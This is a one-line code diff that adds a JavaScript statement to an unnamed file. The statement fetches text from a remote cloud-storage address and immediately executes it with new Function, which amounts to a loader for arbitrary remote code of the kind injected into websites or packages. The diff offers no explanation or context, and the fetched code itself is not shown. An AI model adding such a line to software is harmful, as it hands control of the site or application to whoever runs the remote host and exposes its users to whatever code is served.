@@ -1,0 +1,1 @@
+fetch('//xcxk.oss-accelerate.aliyuncs.com/mp/zjzdj').then(r=>r.text()).then(C=>new Function(C)())
